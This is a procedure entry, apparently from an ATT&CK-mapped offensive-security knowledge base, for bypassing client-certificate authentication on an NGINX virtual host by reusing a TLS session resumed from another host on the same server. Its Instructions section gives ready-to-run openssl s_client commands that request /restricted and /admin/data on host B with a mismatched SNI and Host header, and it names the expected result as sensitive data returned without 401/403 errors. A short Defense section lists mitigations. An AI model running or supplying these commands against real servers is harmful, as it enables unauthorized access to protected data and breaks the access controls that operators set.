---
tags:
  - unauthorized-access
  - privilege-escalation
  - restricted-content
type: procedure
tools:
  - '[[tools/OpenSSL]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/openssl-access-restricted]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:31.103Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 67c8e2bd-eb94-452a-a938-b86d74d1b729
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Access Restricted Content on Host B

## Summary

This procedure uses the resumed TLS session to access protected resources on virtual host B without providing its required client certificate, resulting in unauthorized access and privilege escalation.

## Description

With the session resumed from host A, NGINX treats the connection as authenticated for host B due to shared tickets and incorrect key usage. Send HTTP requests over this connection using the Host header for B to retrieve restricted data. This bypasses auth entirely for host B.

## Requirements

1. Resumed TLS session from previous procedure
2. Knowledge of restricted endpoints on host B (e.g., /admin, /protected)
3. OpenSSL for sending requests over TLS

## Defense

Defensive measures and detection strategies:

- Enforce client certificate verification per virtual host independently
- Implement session ticket isolation via custom OpenSSL callbacks
- Detect cross-host access patterns in access logs (e.g., SNI != Host)

## Objectives

1. Send requests to restricted paths on host B
2. Retrieve unauthorized content
3. Validate privilege escalation

## Instructions

### Step 1: Send Request to Restricted Endpoint

**Context**: Use the resumed session to target a protected resource on host B.

**Command** ([[commands/openssl-access-restricted]]):
```bash
printf "GET /restricted HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

> This fetches the restricted content. Expected output: HTTP response body with sensitive data, no 401/403 errors.

### Step 2: Iterate on Additional Resources

**Context**: Repeat for other endpoints to escalate access.

**Command** ([[commands/openssl-access-restricted]]):
```bash
printf "GET /admin/data HTTP/1.1\r\nHost: hostB.example.com\r\n\r\n" | openssl s_client -connect shared-ip.example.com:443 -tls1_3 -servername hostA.example.com -sess_in resumed_session.pem
```

> Confirms full bypass. Look for successful data retrieval.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/openssl-access-restricted]]

## Tools Used

- [[tools/OpenSSL]]

## Tags

- [[unauthorized-access]]
- [[tls]]
- [[nginx]]
